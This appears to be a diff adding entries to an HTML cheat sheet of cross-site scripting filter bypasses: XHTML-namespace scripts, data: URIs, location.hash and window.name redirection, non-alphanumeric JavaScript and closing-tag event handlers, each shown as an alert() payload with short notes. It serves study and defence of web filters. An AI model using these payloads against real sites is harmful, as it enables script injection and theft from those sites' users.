@@ -49,4 +49,53 @@ x/onmouseover=eval(name)//<br/>
 URLs make you vulnerable<br/>
 &lt;img src="http://0x.lv/onerror=alert(1)//"&gt;<br/>
 After filter:<br/>
-&lt;img src#"http: 0x.lv onerror=alert(1)//"&gt;</body></html>
+&lt;img src#"http: 0x.lv onerror=alert(1)//"&gt;<br/>
+<br/>
+<b>text/xml-xhtml</b><br/>
+Content served as text/xml and text/xml-xhtml can execute JavaScript by using html and xhtml namespaces<br/>
+&lt;x:script xmlns:x="http://www.w3.org/1999/xhtml"&gt;alert('xss');&lt;/x:script&gt;<br/>
+<br/>
+<b>data:text/html and data:text/html;base64</b><br/>
+data:text/html,&lt;script&gt;alert(0)&lt;/script&gt;<br/>
+data:text/html;base64, PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg==<br/>
+<br/>
+<b>location=name; </b>&nbsp;<br/>
+location='javascript:alert(0)';<br/>
+Victim is not actually redirected anywhere so it can be transparent<br/>
+name = window.name<br/>
+Downside: attacker controlled website must be involved<br/>
+Downside: persistent XSS is demoted to reflective XSS<br/>
+<br/>
+<b>location=location.hash.slice(1); &nbsp;//avoid the #</b><br/>
+http://victim.com/?param=";location=location.hash)//#0={};alert(0)<br/>
+location=location.hash &nbsp; //FF only<br/>
+Payload comes after hash in URL<br/>
+Victim website does not see true payload<br/>
+No parenthesis in second one<br/>
+In FireFox, you can incorporate the hash symbol as a sharp variable, #0={}<br/>
+<br/>
+<b>slice() and location.string</b><br/>
+eval(document.referrer.slice(10));<ul><li style="list-style-type: none">When attacker controls referrer page</li>
+</ul>
+eval(0+location.string) &nbsp; &nbsp;//or 1+location.string<ul><li style="list-style-type: none">Use a ternary operator along with fake GET paramaters, e.g.</li>
+<li style="list-style-type: none">0?fake1=1/*&amp;id=42&amp;name=";eval(1+location.string);"&amp;lang=EN&amp;fake2=*/:alert(0)</li>
+</ul>
+<br/>
+<b>References references</b><br/>
+É=[Å=[],µ=!Å+Å][µ[È=-~-~++Å]+({}+Å) [Ç=!!Å+µ,ª=Ç[Å]+Ç[+!Å],Å]+ª])() [µ[Å]+µ[Å+Å]+Ç[È]+ª](Å)<br/>
+<br/>
+($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''+$)[_/_]+$_[+$])])()[__[_/_]+__[_+~$]+$_[_]+$$](_/_)<br/>
+<br/>
+what, you don't see the alert(1) in there?<br/>
+no alphanumeric characters, can execute arbitrary JavaScript<br/>
+kudos to Yosuke Hasegawa<br/>
+This is similar to obfuscation done in PHP shells section<br/>
+<br/>
+<b>HTML5 </b>&nbsp;<b>allows attributes in closing tags too</b><br/>
+&lt;/a onmousemove="alert(1)"&gt;<br/>
+<br/>
+<b>Eating chars</b><br/>
+&lt;img src="x:ö" title="onerror=alert(1)//"&gt;<br/>
+Some decoding will transform to:<ul><li style="list-style-type: none">&lt;img src="x:? title=" onerror=alert(1)//"&gt; allowing xss</li>
+</ul>
+</body></html>
